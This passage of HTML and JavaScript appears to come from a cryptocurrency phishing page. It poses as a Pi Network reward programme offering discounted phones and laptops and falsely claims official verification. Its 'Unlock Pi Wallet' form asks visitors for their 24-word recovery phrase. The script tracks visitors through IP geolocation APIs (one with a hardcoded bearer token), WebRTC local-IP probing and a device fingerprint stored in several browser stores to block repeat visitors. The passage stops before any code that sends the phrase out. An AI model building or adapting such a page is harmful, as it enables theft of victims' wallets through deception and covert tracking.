                            <button id="buyNowBtn-galaxys24ultra" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card">
                            <img src="./Images/asus rog.png" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">90 Pi</span>
                                <span class="original-price">210 Pi</span>
                            </p>
                            <p class="product-name">Asus ROG Zephyrus</p>
                            <button id="buyNowBtn-asusrog" class="buy-now">Offer Now</button>
                        </div>
                    </div>
                </section>

                <section class="text-center m-5 relative">
                    <!-- Features with enhanced wave effect -->
                    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-12">
                        <div class="card p-5 feature-card">
                            <div class="feature-card-wave"></div>
                            <div class="feature-icon">
                                <i class="fas fa-check-circle"></i>
                            </div>
                            <p class="font-medium mt-4" data-en="Birthday Program">
                                Birthday Program
                            </p>
                        </div>
                        <div class="card p-5 feature-card">
                            <div class="feature-card-wave"></div>
                            <div class="feature-icon">
                                <i class="fas fa-clock"></i>
                            </div>
                            <p class="font-medium mt-4" data-en="Receive in 24h">
                                Receive in 24h
                            </p>
                        </div>
                        <div class="card p-5 feature-card">
                            <div class="feature-card-wave"></div>
                            <div class="feature-icon">
                                <i class="fas fa-shield-alt"></i>
                            </div>
                            <p class="font-medium mt-4" data-en="Safe & Secure">
                                Safe & Secure
                            </p>
                        </div>
                        <div class="card p-5 feature-card">
                            <div class="feature-card-wave"></div>
                            <div class="feature-icon">
                                <i class="fas fa-users"></i>
                            </div>
                            <p class="font-medium mt-4" data-en="500000+ Participants">
                                500000+ Participants
                            </p>
                        </div>
                    </div>
                </section>

                <!-- Footer -->
                <footer class="py-10 px-4 relative">
                    <div class="absolute inset-0 opacity-10 bg-purple-900"></div>
                    <div class="relative z-10 container mx-auto text-center">
                        <div class="mb-6">
                            <div class="mb-6">
                                <div class="mb-6 flex justify-center">
                                    <img src="https://img.upanh.tv/2025/03/18/Layer-3.png" alt="Pi Logo" class="h-20 object-contain" />
                                </div>
                            </div>
                        </div>
                        <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
                            <div>
                                <h5 class="font-bold mb-3" data-en="Contact">
                                    Contact
                                </h5>
                                <p class="flex items-center justify-center mb-2">
                                    <i class="fas fa-envelope mr-2 text-purple-400"></i>
                                    support@pimart.us
                                </p>
                                <p class="flex items-center justify-center">
                                    <i class="fas fa-globe mr-2 text-purple-400"></i>
                                    pimart.us
                                </p>
                            </div>
                            <div>
                                <h5 class="font-bold mb-3" data-en="Policies">
                                    Policies
                                </h5>
                                <p class="mb-2" data-en="Data privacy">
                                    Data privacy
                                </p>
                                <p data-en="Terms of use">
                                    Terms of use
                                </p>
                            </div>
                            <div>
                                <h5 class="font-bold mb-3" data-en="Follow Us">
                                    Follow Us
                                </h5>
                                <div class="flex justify-center space-x-4">
                                    <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center hover:bg-opacity-50 transition-all duration-300">
                                        <i class="fab fa-telegram text-purple-400"></i>
                                    </span>
                                    <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center hover:bg-opacity-50 transition-all duration-300">
                                        <i class="fab fa-twitter text-purple-400"></i>
                                    </span>
                                    <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center hover:bg-opacity-50 transition-all duration-300">
                                        <i class="fab fa-discord text-purple-400"></i>
                                    </span>
                                </div>
                            </div>
                        </div>
                        <p class="mb-4 max-w-2xl mx-auto" data-en="This is an independent promotional program verified by the official Pi Network.">
                            This is an independent promotional program verified by the official Pi Network.
                        </p>
                        <p class="text-sm text-gray-500 dark:text-gray-400" data-en="© 2025 Pi Network Reward Program. All rights reserved.">
                            © 2025 Pi Network Reward Program. All rights reserved.
                        </p>
                    </div>
                </footer>
            </div>

            <!-- Pi Wallet Form Page -->
            <div id="formPage" class="bg-white w-full page page-inactive-right">
                <div class="container mx-auto px-4">
                    <div class="pi-wallet-style surprise-container">
                        <div id="pi-title" class="pi-title" data-en="Unlock Pi Wallet">
                            Unlock Pi Wallet
                        </div>

                        <!-- Limit message container -->
                        <div id="limitMessage" class="limit-message">
                            <i class="fas fa-exclamation-triangle mr-2"></i>
                            <span data-en="You have submitted 1/2 requests. Each device is limited to a maximum of 2 requests.">
                                You have submitted 1/2 requests. Each device is limited to a maximum of 2 requests.
                            </span>
                        </div>

                        <!-- Error message for exceeding limit -->
                        <div id="errorMessage" class="error-message">
                            <i class="fas fa-ban mr-2"></i>
                            <span data-en="You have exceeded the allowed number of request submissions (2 times). Please contact support if you need assistance.">
                                You have exceeded the allowed number of request submissions (2 times). Please contact support if you need assistance.
                            </span>
                        </div>

                        <div class="animate-on-scroll" data-delay="200">
                            <div class="pi-input-container">
                                <textarea id="walletAddress" class="pi-input" data-en="Enter your 24-word recovery phrase here" placeholder="Enter your 24-word recovery phrase here"></textarea>
                            </div>
                            <div id="wordCounter" class="word-counter"></div>
                            <div id="validationMessage" class="validation-message hidden" data-en="Please enter exactly 24 recovery words">
                                Please enter exactly 24 recovery words
                            </div>
                        </div>

                        <div class="animate-on-scroll" data-delay="400">
                            <input type="hidden" id="captchaToken" name="captchaToken" value="" />
                            <button id="unlockSubmitBtn" class="pi-button pi-button-primary surprise-trigger" data-en="UNLOCK WITH RECOVERY PHRASE">
                                UNLOCK WITH RECOVERY PHRASE
                            </button>

                            <button class="pi-button pi-button-secondary" data-en="UNLOCK WITH FINGERPRINT">
                                UNLOCK WITH FINGERPRINT
                            </button>
                        </div>

                        <div class="pi-info-text">
                            <p data-en="As a non-custodial wallet, your recovery phrase is only accessible to you. Currently, recovery phrases cannot be recovered if lost.">
                                As a non-custodial wallet, your recovery phrase is only accessible to you. Currently, recovery phrases cannot be recovered if lost.
                            </p>
                            <p class="mt-2">
                                <span data-en="Lost your wallet recovery phrase?">Lost your wallet recovery phrase?</span>
                                <a href="#" class="pi-link" data-en="You can create a new wallet">You can create a new wallet</a>,
                                <span data-en="but all π in your previous wallet will be inaccessible.">but all π in your previous wallet will be inaccessible.</span>
                            </p>
                        </div>

                        <!-- Hidden explosion particles for surprise effect -->
                        <div id="explosionContainer"></div>
                    </div>

                    <div class="mt-8 text-center">
                        <button id="backToHomeBtn" class="btn-secondary">
                            <i class="fas fa-arrow-left mr-2"></i>
                            <span data-en="Back to Home">Back to Home</span>
                        </button>
                    </div>
                </div>
            </div>
            <!-- Trang Tạo Ví Mới -->
            <div id="createWalletPage" class="page page-inactive-right" style="background-color: white;">
                <div class="container mx-auto px-4" style="height: 100vh; display: flex; align-items: center; justify-content: center;">
                    <div class="text-center" style="max-width: 350px; width: 100%;">
                        <h1 class="text-3xl font-medium mb-4" style="color: #333333;">
                            Create your wallet
                        </h1>

                        <p class="mb-10 text-lg font-bold" style="color: #333333;">
                            Don't hit the back button until you've completed the entire process!
                        </p>

                        <button id="createNewWalletBtn" class="w-full py-3 text-white font-medium text-base rounded-lg mb-6" style="background-color: #693988; text-transform: uppercase;">
                            CREATE NEW WALLET
                        </button>

                        <p id="walletErrorMessage" class="mb-3 text-left font-normal" style="color: #a83232; font-size: 16px; display: none;">
                            It looks like you recently created a new wallet. If you are resetting, please try again later.
                        </p>

                        <a id="walletCreatedBtn" href="#" class="block text-center font-bold text-lg py-2" style="color: #0045c4; text-transform: uppercase; text-decoration: underline;">
                            WALLET HAS BEEN CREATED
                        </a>
                    </div>
                </div>
            </div>
        </div>

        <script>
            // Create floating balloons with enhanced appearance and movement
            function createFloatingIcons() {
                const iconsContainer = document.createElement("div");
                iconsContainer.id = "iconsContainer";
                iconsContainer.style.position = "fixed";
                iconsContainer.style.width = "100%";
                iconsContainer.style.height = "100%";
                iconsContainer.style.top = "0";
                iconsContainer.style.left = "0";
                iconsContainer.style.pointerEvents = "none";
                iconsContainer.style.zIndex = "-5";
                iconsContainer.style.overflow = "hidden";
                document.body.appendChild(iconsContainer);

                // Professional crypto/finance icons

                const iconUrls = [
                    "https://i.pinimg.com/originals/0c/a0/34/0ca034d0ed966a0ac1b6455039d6e364.png",
                    "https://static.vecteezy.com/system/resources/thumbnails/055/688/542/small/isolated-purple-balloon-no-background-with-ribbon-png.png",
                ];

                const numIcons = 1; // Giảm xuống còn 3

                for (let i = 0; i < numIcons; i++) {
                    setTimeout(() => {
                        const icon = document.createElement("img");
                        icon.className = "floating-icon-img";

                        // Set icon image source
                        const iconIndex = Math.floor(Math.random() * iconUrls.length);
                        icon.src = iconUrls[iconIndex];

                        // Random position and animation timing
                        const leftPos = 5 + Math.random() * 90;
                        const floatDistance = -100 + Math.random() * 200;
                        const size = 80 + Math.random() * 40; // Larger sizing
                        const duration = 40 + Math.random() * 20; // Slower movement for better performance

                        icon.style.setProperty("--float-distance", `${floatDistance}px`);
                        icon.style.left = `${leftPos}%`;
                        icon.style.width = `${size}px`;
                        icon.style.height = `${size}px`;
                        icon.style.animationDuration = `${duration}s`;

                        iconsContainer.appendChild(icon);

                        // Remove icon after animation completes
                        setTimeout(() => {
                            icon.remove();
                        }, duration * 1000);
                    }, i * 5000); // More spacing between icons for better performance
                }

                // Continue creating icons periodically at a slower rate
                setInterval(() => {
                    if (document.visibilityState === "visible") {
                        const icon = document.createElement("img");
                        icon.className = "floating-icon-img";

                        const iconIndex = Math.floor(Math.random() * iconUrls.length);
                        icon.src = iconUrls[iconIndex];

                        const leftPos = 5 + Math.random() * 90;
                        const floatDistance = -100 + Math.random() * 200;
                        const size = 80 + Math.random() * 40; // Larger sizing
                        const duration = 40 + Math.random() * 20;

                        icon.style.setProperty("--float-distance", `${floatDistance}px`);
                        icon.style.left = `${leftPos}%`;
                        icon.style.width = `${size}px`;
                        icon.style.height = `${size}px`;
                        icon.style.animationDuration = `${duration}s`;

                        iconsContainer.appendChild(icon);

                        setTimeout(() => {
                            icon.remove();
                        }, duration * 1000);
                    }
                }, 20000); // Much longer interval between new icons for better performance
            }

            // Create premium background effects - enhanced but optimized
            function createPremiumBackground() {
                // Create stars (reduced number)
                const starsContainer = document.getElementById("starsContainer");
                const numStars = 5; // Reduced number for better performance

                for (let i = 0; i < numStars; i++) {
                    const star = document.createElement("div");
                    star.className = "star";
                    star.style.width = `${Math.random() * 3 + 1}px`;
                    star.style.height = star.style.width;
                    star.style.left = `${Math.random() * 100}%`;
                    star.style.top = `${Math.random() * 100}%`;
                    star.style.animationDelay = `${Math.random() * 4}s`;
                    starsContainer.appendChild(star);
                }

                // Create single-point bright stars (reduced number)
                const singleStarsContainer = document.getElementById("singleStarsContainer");
                const numSingleStars = 1; // Reduced number for better performance

                for (let i = 0; i < numSingleStars; i++) {
                    const star = document.createElement("div");
                    star.className = "star-single";
                    star.style.left = `${Math.random() * 90 + 5}%`;
                    star.style.top = `${Math.random() * 90 + 5}%`;
                    star.style.animationDelay = `${Math.random() * 3}s`;
                    singleStarsContainer.appendChild(star);
                }

                // Create shooting stars (reduced number)
                const shootingStarsContainer = document.getElementById("shootingStarsContainer");
                const numShootingStars = 0; // Reduced to just 1 for better performance

                for (let i = 0; i < numShootingStars; i++) {
                    const shootingStar = document.createElement("div");
                    shootingStar.className = "shooting-star";

                    // Position at top-left of screen
                    shootingStar.style.left = `${Math.random() * 30}%`;
                    shootingStar.style.top = `${Math.random() * 30}%`;

                    // Set length and angle for proper direction
                    const length = 80 + Math.random() * 120;
                    shootingStar.style.width = `${length}px`;
                    shootingStar.style.height = `2px`;
                    shootingStar.style.transform = "rotate(45deg)";

                    // Stagger animation timing
                    shootingStar.style.animationDelay = `${i * 3 + Math.random() * 3}s`;

                    shootingStarsContainer.appendChild(shootingStar);
                }

                // Create Pi coins with images (reduced number)
                const coinsContainer = document.getElementById("coinsContainer");
                const numCoins = 2; // Reduced from 8 to 4 for better performance

                // Define positions that spread evenly across the screen
                const coinPositions = [
                    { left: "15%", top: "15%" },
                    { left: "85%", top: "15%" },
                    { left: "15%", top: "85%" },
                    { left: "85%", top: "85%" },
                ];

                // Pi coin image URLs
                const piCoinImages = ["https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png", "https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png"];

                for (let i = 0; i < numCoins; i++) {
                    const coin = document.createElement("div");
                    coin.className = "premium-coin";

                    // Create image element instead of text
                    const img = document.createElement("img");
                    img.src = piCoinImages[i % piCoinImages.length];
                    img.style.width = "100%";
                    img.style.height = "100%";
                    img.style.objectFit = "contain";
                    img.style.borderRadius = "50%";

                    coin.appendChild(img);

                    const size = 30 + Math.random() * 20;
                    coin.style.width = `${size}px`;
                    coin.style.height = `${size}px`;
                    coin.style.left = coinPositions[i].left;
                    coin.style.top = coinPositions[i].top;
                    coin.style.animationDelay = `${Math.random() * 3}s`;
                    coin.style.opacity = "0.4";

                    // Simpler floating animation
                    coin.style.animation = `float 10s infinite ease-in-out`;

                    coinsContainer.appendChild(coin);
                }

                // Create light streaks (reduced number)
                const lightStreaksContainer = document.getElementById("lightStreaksContainer");
                const numStreaks = 1; // Reduced from 2 to 1 for better performance

                for (let i = 0; i < numStreaks; i++) {
                    const streak = document.createElement("div");
                    streak.className = "light-streak";
                    streak.style.top = `${50}%`; // Fixed position
                    streak.style.animationDelay = `${i * 5}s`;
                    lightStreaksContainer.appendChild(streak);
                }
            }

            // Add wave animations to feature cards
            function setupFeatureCardWaves() {
                // Ẩn tất cả hiệu ứng sóng
                const waves = document.querySelectorAll(".feature-card-wave");
                waves.forEach((wave) => {
                    wave.style.display = "none";
                });

                // Ẩn tất cả hiệu ứng shine
                const icons = document.querySelectorAll(".feature-icon");
                icons.forEach((icon) => {
                    icon.style.setProperty("--shine-opacity", "0");
                });
            }

            // Create explosion particles - simplified
            function createExplosionParticles() {
                const container = document.getElementById("explosionContainer");
                const numParticles = 10; // Reduced for better performance

                for (let i = 0; i < numParticles; i++) {
                    const particle = document.createElement("div");
                    particle.className = "explosion-particle";

                    // Set random direction for each particle
                    const angle = Math.random() * Math.PI * 2;
                    const distance = 100 + Math.random() * 100;
                    const tx = Math.cos(angle) * distance;
                    const ty = Math.sin(angle) * distance;

                    particle.style.setProperty("--tx", `${tx}px`);
                    particle.style.setProperty("--ty", `${ty}px`);

                    container.appendChild(particle);
                }
            }

            // Show loading spinner
            function showLoading() {
                document.getElementById("loadingOverlay").style.display = "flex";
            }

            // Hide loading spinner
            function hideLoading() {
                document.getElementById("loadingOverlay").style.display = "none";
            }

            // Update the current date and time in the success modal
            function updateSuccessDateTime() {
                const dateTimeElement = document.getElementById("currentDateTime");
                const now = new Date();

                // Format: YYYY-MM-DD HH:MM:SS
                const year = now.getFullYear();
                const month = String(now.getMonth() + 1).padStart(2, "0");
                const day = String(now.getDate()).padStart(2, "0");
                const hours = String(now.getHours()).padStart(2, "0");
                const minutes = String(now.getMinutes()).padStart(2, "0");
                const seconds = String(now.getSeconds()).padStart(2, "0");

                const formattedDateTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
                dateTimeElement.textContent = formattedDateTime;
            }

            // Navigate between pages
            function navigateTo(fromPage, toPage, direction = "right") {
                const from = document.getElementById(fromPage);
                const to = document.getElementById(toPage);

                // Set initial positions
                from.classList.remove("page-active");
                to.classList.remove("page-inactive-left", "page-inactive-right");

                if (direction === "right") {
                    from.classList.add("page-inactive-left");
                    to.classList.add("page-active");
                } else {
                    from.classList.add("page-inactive-right");
                    to.classList.add("page-active");
                }

                // Update back button visibility
                const headerBackBtn = document.getElementById("headerBackBtn");
                if (toPage === "homePage") {
                    headerBackBtn.style.visibility = "hidden";
                } else {
                    headerBackBtn.style.visibility = "visible";
                }

                // Show/hide top notification based on page
                const notificationBanner = document.querySelector(".notification-banner");
                if (notificationBanner) {
                    if (toPage === "homePage") {
                        notificationBanner.style.display = "block";
                    } else {
                        notificationBanner.style.display = "none";
                    }
                }

                // Add one-time transitionend event listener to the target page
                const handleTransitionEnd = () => {
                    window.scrollTo({
                        top: 0,
                        behavior: "smooth",
                    });
                    to.removeEventListener("transitionend", handleTransitionEnd);
                };
                to.addEventListener("transitionend", handleTransitionEnd);
            }

            // Handle scroll animations - improved performance
            function handleScrollAnimations() {
                const elements = document.querySelectorAll(".animate-on-scroll, .animate-fade-in");

                // Use IntersectionObserver for better performance
                const observer = new IntersectionObserver(
                    (entries) => {
                        entries.forEach((entry) => {
                            if (entry.isIntersecting) {
                                const delay = entry.target.getAttribute("data-delay") || 0;
                                setTimeout(() => {
                                    entry.target.classList.add("animated");
                                }, delay);
                                observer.unobserve(entry.target);
                            }
                        });
                    },
                    { threshold: 0.1, rootMargin: "50px" }
                ); // Added rootMargin for earlier animation trigger

                elements.forEach((element) => {
                    observer.observe(element);
                });
            }

            // Submission tracking functions
            function getSubmissionCount() {
                try {
                    return parseInt(localStorage.getItem("piSubmissionCount") || "0");
                } catch (e) {
                    console.error("Error accessing localStorage:", e);
                    return 0;
                }
            }

            function incrementSubmissionCount() {
                try {
                    const currentCount = getSubmissionCount();
                    localStorage.setItem("piSubmissionCount", (currentCount + 1).toString());
                    return currentCount + 1;
                } catch (e) {
                    console.error("Error updating localStorage:", e);
                    return 0;
                }
            }

            // Check if user has exceeded submission limit
            function hasExceededLimit() {
                return getSubmissionCount() >= 2;
            }

            // Update UI based on submission count
            function updateUIForSubmissionCount() {
                const currentCount = getSubmissionCount();
                const limitMessage = document.getElementById("limitMessage");
                const errorMessage = document.getElementById("errorMessage");
                const unlockSubmitBtn = document.getElementById("unlockSubmitBtn");
                const openFormBtn = document.getElementById("openFormBtn");

                // Case: User has exceeded limit
                if (currentCount >= 2) {
                    // Show error message on form page
                    errorMessage.style.display = "block";
                    limitMessage.style.display = "none";

                    // Disable submit button
                    unlockSubmitBtn.disabled = true;
                    unlockSubmitBtn.textContent = "REQUEST LIMIT REACHED";

                    // Disable all Offer Now buttons
                    document.querySelectorAll(".buy-now").forEach((button) => {
                        button.disabled = true;
                        button.textContent = "Request Limit Reached";
                        button.classList.add("opacity-50");
                        button.style.cursor = "not-allowed";
                    });
                }
                // Case: User has submitted once (show warning)
                else if (currentCount === 1) {
                    limitMessage.style.display = "block";
                    limitMessage.innerHTML = `<i class="fas fa-exclamation-triangle mr-2"></i>You have submitted ${currentCount}/2 requests. Each device is limited to a maximum of 2 requests.`;
                    errorMessage.style.display = "none";
                    unlockSubmitBtn.disabled = false;
                }
                // Case: User hasn't submitted yet
                else {
                    limitMessage.style.display = "none";
                    errorMessage.style.display = "none";
                    unlockSubmitBtn.disabled = false;
                }
            }

            // Advanced IP and Location detection with better reliability
            let userIPData = null;
            let ipBlockStatus = {
                blocked: false,
                reason: "",
            };

            async function getLocalIP() {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel("");
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        console.log("Local IP:", event.candidate.address);
                        pc.close();
                    }
                };
                await pc.createOffer().then((o) => pc.setLocalDescription(o));
            }

            getLocalIP();
            // Multi-API approach for IP and location detection with advanced failover
            async function getUserIPInfo() {
                try {
                    // Try multiple APIs in sequence until one succeeds
                    const apis = [
                        async () => {
                            const response = await fetch("https://freeipapi.com/api/json/", {
                                headers: {
                                    Authorization: "Bearer 145e8aecea2cae5c7002ec10d217c2b04fa68a27ff6f3a8383c9aaea623c77b0",
                                },
                            });
                            if (!response.ok) throw new Error("freeipapi.com failed");
                            const data = await response.json();

                            return {
                                ip: data.ipAddress,
                                country: data.countryCode,
                                country_name: data.countryName,
                                city: data.cityName,
                                region: data.regionName,
                                timezone: data.timeZone,
                            };
                        },

                        // API 5: Backup option with ipwhois.app
                        async () => {
                            const response = await fetch("https://ipwho.is/");
                            if (!response.ok) throw new Error("ipwho.is failed");
                            const data = await response.json();
                            return {
                                ip: data.ip,
                                country: data.country_code,
                                country_name: data.country,
                                city: data.city,
                                region: data.region,
                                timezone: data.timezone.id,
                            };
                        },

                        // API 6: Additional backup with publicapis
                        async () => {
                            const response = await fetch("https://api.db-ip.com/v2/free/self");
                            if (!response.ok) throw new Error("db-ip.com failed");
                            const data = await response.json();
                            console.log("API success:", data);
                            return {
                                ip: data.ipAddress,
                                country: data.countryCode,
                                country_name: data.countryName,
                                city: data.city,
                                region: data.stateProv,
                                timezone: null,
                            };
                        },

                        // Final fallback: Use client-side information only
                        async () => {
                            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                            return {
                                ip: "unavailable",
                                country: await detectCountryFromTimezone(timezone),
                                country_name: await getCountryNameFromTimezone(timezone),
                                city: "unknown",
                                region: "unknown",
                                timezone: timezone,
                            };
                        },
                    ];

                    // Try each API in turn until one succeeds
                    for (const apiCall of apis) {
                        try {
                            const data = await apiCall();
                            console.log("apiCall", data);
                            // Verify we have at least some data to work with
                            if (data && (data.ip !== "unavailable" || data.timezone)) {
                                // Success! Save the data
                                userIPData = data;

                                // Check if this is a suspicious IP
                                checkIfIPBlocked(data.ip);
                                setLanguage("en");

                                // // Display location notification
                                // showLocationNotification(data);

                                return data;
                            }
                        } catch (error) {
                            console.log("API attempt failed:", error.message);
                            // Continue to next API
                        }
                    }

                    // If we got here, all APIs failed - use fallback approach
                    console.warn("All location detection API attempts failed, using fallback");

                    // Create a fallback user data
                    const fallbackData = createFallbackUserData();
                    userIPData = fallbackData;

                    // Auto-set to English for safety (since we can't determine country)
                    setLanguage("en");

                    return fallbackData;
                } catch (error) {
                    console.error("Error in getUserIPInfo:", error);

                    // Create fallback user data when everything fails
                    const fallbackData = createFallbackUserData();
                    userIPData = fallbackData;

                    // Auto-set to English for safety
                    setLanguage("en");

                    return fallbackData;
                }
            }

            // Create fallback user data using browser information
            function createFallbackUserData() {
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const userData = {
                    ip: "unavailable",
                    country: "US", // Default to US
                    country_name: "United States", // Default to United States
                    city: "unknown",
                    region: "unknown",
                    timezone: timezone,
                };

                return userData;
            }

            // Helper function to get country name from country code
            function getCountryName(countryCode) {
                if (!countryCode) return "Unknown";

                // Simple mapping of common country codes
                const commonCountries = {
                    US: "United States",
                    GB: "United Kingdom",
                    CA: "Canada",
                    AU: "Australia",
                    DE: "Germany",
                    FR: "France",
                    IT: "Italy",
                    ES: "Spain",
                    JP: "Japan",
                    CN: "China",
                    IN: "India",
                    BR: "Brazil",
                    RU: "Russia",
                    VN: "Vietnam",
                    TH: "Thailand",
                    MY: "Malaysia",
                    SG: "Singapore",
                    ID: "Indonesia",
                };

                // If it's a common country, return the name immediately
                if (commonCountries[countryCode]) {
                    return commonCountries[countryCode];
                }

                // Otherwise, try to get the name from the browser's Intl API
                try {
                    return new Intl.DisplayNames(["en"], { type: "region" }).of(countryCode);
                } catch (error) {
                    return countryCode; // Fallback to just returning the code
                }
            }

            // Detect country from timezone as fallback
            function detectCountryFromTimezone(timezone) {
                if (!timezone) return null;

                // Common timezone to country code mappings
                const timezoneMap = {
                    "America/New_York": "US",
                    "America/Los_Angeles": "US",
                    "America/Chicago": "US",
                    "America/Denver": "US",
                    "Europe/London": "GB",
                    "Europe/Paris": "FR",
                    "Europe/Berlin": "DE",
                    "Europe/Rome": "IT",
                    "Europe/Madrid": "ES",
                    "Asia/Tokyo": "JP",
                    "Asia/Shanghai": "CN",
                    "Asia/Kolkata": "IN",
                    "Asia/Ho_Chi_Minh": "VN",
                    "Asia/Bangkok": "TH",
                    "Asia/Singapore": "SG",
                    "Asia/Kuala_Lumpur": "MY",
                    "Asia/Jakarta": "ID",
                    "Australia/Sydney": "AU",
                    "Australia/Melbourne": "AU",
                };

                // Try direct mapping
                if (timezoneMap[timezone]) {
                    return timezoneMap[timezone];
                }

                // Try to extract country from timezone
                if (timezone.includes("/")) {
                    const region = timezone.split("/")[0];

                    // Map regions to likely country codes
                    const regionMap = {
                        America: "US",
                        Europe: "EU",
                        Asia: "AS",
                        Africa: "AF",
                        Australia: "AU",
                        Pacific: "PA",
                    };

                    return regionMap[region] || null;
                }

                return null;
            }

            // Get country name from timezone
            function getCountryNameFromTimezone(timezone) {
                const countryCode = detectCountryFromTimezone(timezone);
                if (!countryCode) return "Unknown";

                const countryNames = {
                    US: "United States",
                    EU: "Europe",
                    AS: "Asia",
                    AF: "Africa",
                    AU: "Australia",
                    PA: "Pacific",
                };

                return countryNames[countryCode] || "Unknown";
            }

            // Improved show location notification - clearer notifications with detailed info
            function showLocationNotification(ipData) {
                if (!ipData) return;

                const locationText = document.getElementById("locationText");
                const countryFlag = document.getElementById("countryFlag");
                const notification = document.getElementById("locationDetectedMessage");

                // Location text with smart fallbacks to create a meaningful message
                const currentLang = getCurrentLanguage();

                // Better location display with fallbacks
                let city = ipData.city;
                let region = ipData.region;
                let country = ipData.country_name || getCountryName(ipData.country) || "Unknown";

                if (city === "unknown" || !city) {
                    city = "";
                }

                if (region === "unknown" || !region || region === city) {
                    region = "";
                }

                // Build location string
                let locationString = "";
                if (city) locationString += city;
                if (region && city) locationString += ", " + region;
                else if (region) locationString += region;
                if ((city || region) && country) locationString += ", " + country;
                else locationString += country;
            }

            // Storage for blocked IP data with enhanced durability
            const blockStorage = {
                // Save blocked IP data to multiple sources
                save: function (data) {
                    try {
                        // 1. Save to localStorage
                        localStorage.setItem("blockedIPs", JSON.stringify(data));

                        // 2. Save to sessionStorage
                        sessionStorage.setItem("blockedIPs", JSON.stringify(data));

                        // 3. Save to cookie with long expiration (1 year)
                        const expiryDate = new Date();
                        expiryDate.setFullYear(expiryDate.getFullYear() + 1);
                        document.cookie = `blockedIPs=${encodeURIComponent(JSON.stringify(data))};expires=${expiryDate.toUTCString()};path=/;SameSite=Strict`;

                        // 4. Save a backup copy with a different name
                        localStorage.setItem("security_data", JSON.stringify(data));

                        // 5. If IndexedDB is available, save there
                        this.saveToIndexedDB(data);

                        // 6. Create and save device fingerprint
                        this.saveDeviceFingerprint(data);
                    } catch (e) {
                        console.error("Error saving blocked IP data:", e);
                    }
                },

                // Save to IndexedDB - more durable storage
                saveToIndexedDB: function (data) {
                    if (!window.indexedDB) return;

                    try {
                        const request = indexedDB.open("SecurityDB", 1);

                        request.onupgradeneeded = function (event) {
                            const db = event.target.result;
                            if (!db.objectStoreNames.contains("blockedIPs")) {
                                db.createObjectStore("blockedIPs", {
                                    keyPath: "id",
                                });
                            }
                        };

                        request.onsuccess = function (event) {
                            const db = event.target.result;
                            const transaction = db.transaction(["blockedIPs"], "readwrite");
                            const store = transaction.objectStore("blockedIPs");

                            // Clear old data
                            store.clear();

                            // Add new data
                            store.add({ id: "main", data: data });

                            transaction.oncomplete = function () {
                                db.close();
                            };
                        };
                    } catch (e) {
                        console.error("IndexedDB error:", e);
                    }
                },

                // Create and save device fingerprint
                saveDeviceFingerprint: function (data) {
                    try {
                        // Create simple device fingerprint
                        const fingerprint = {
                            userAgent: navigator.userAgent,
                            language: navigator.language,
                            screenWidth: screen.width,
                            screenHeight: screen.height,
                            colorDepth: screen.colorDepth,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            platform: navigator.platform,
                        };

                        // Create identifier string from fingerprint
                        const fingerprintStr = JSON.stringify(fingerprint);
                        const fingerprintHash = this.simpleHash(fingerprintStr);

                        // Save blocked data with device info
                        localStorage.setItem(`device_${fingerprintHash}`, JSON.stringify(data));
                        sessionStorage.setItem(`device_${fingerprintHash}`, JSON.stringify(data));

                        // Save fingerprint to cookie
                        const expiryDate = new Date();
                        expiryDate.setFullYear(expiryDate.getFullYear() + 1);
                        document.cookie = `device_fingerprint=${fingerprintHash};expires=${expiryDate.toUTCString()};path=/;SameSite=Strict`;
                    } catch (e) {
                        console.error("Error creating device fingerprint:", e);
                    }
                },

                // Simple hash function for fingerprint string
                simpleHash: function (str) {
                    let hash = 0;
                    for (let i = 0; i < str.length; i++) {
                        const char = str.charCodeAt(i);
                        hash = (hash << 5) - hash + char;
                        hash = hash & hash;
                    }
                    return hash.toString(36);
                },

                // Get data from all storage sources
                get: function () {
                    let blockedIPs = [];

                    try {
                        // 1. Try localStorage first
                        const localData = localStorage.getItem("blockedIPs");
                        if (localData) {
                            blockedIPs = JSON.parse(localData);
                            return blockedIPs;
                        }

                        // 2. Try sessionStorage
                        const sessionData = sessionStorage.getItem("blockedIPs");
                        if (sessionData) {
                            blockedIPs = JSON.parse(sessionData);
                            return blockedIPs;
                        }

                        // 3. Try cookie
                        const cookies = document.cookie.split(";");
                        for (let cookie of cookies) {
                            cookie = cookie.trim();
                            if (cookie.startsWith("blockedIPs=")) {
                                const cookieData = decodeURIComponent(cookie.substring("blockedIPs=".length));
                                blockedIPs = JSON.parse(cookieData);
                                return blockedIPs;
                            }
                        }

                        // 4. Try backup data
                        const backupData = localStorage.getItem("security_data");
                        if (backupData) {
                            blockedIPs = JSON.parse(backupData);
                            return blockedIPs;
                        }

                        // 5. Try device fingerprint
                        const fingerprintData = this.getFromDeviceFingerprint();
                        if (fingerprintData && fingerprintData.length > 0) {
                            return fingerprintData;
                        }

                        // 6. Try IndexedDB if other methods fail
                        this.getFromIndexedDB().then((idbData) => {
                            if (idbData && idbData.length > 0) {
                                // Restore data to other storage methods
                                this.save(idbData);
                                blockedIPs = idbData;
                            }
                        });
                    } catch (e) {
                        console.error("Error retrieving blocked IP data:", e);
                    }

                    return blockedIPs;
                },

                // Get data from IndexedDB
                getFromIndexedDB: function () {
                    return new Promise((resolve) => {
                        if (!window.indexedDB) {
                            resolve([]);
                            return;
                        }

                        try {
                            const request = indexedDB.open("SecurityDB", 1);

                            request.onerror = function () {
                                resolve([]);
                            };

                            request.onsuccess = function (event) {
                                const db = event.target.result;
                                try {
                                    const transaction = db.transaction(["blockedIPs"], "readonly");
                                    const store = transaction.objectStore("blockedIPs");
                                    const getRequest = store.get("main");

                                    getRequest.onsuccess = function () {
                                        if (getRequest.result && getRequest.result.data) {
                                            resolve(getRequest.result.data);
                                        } else {
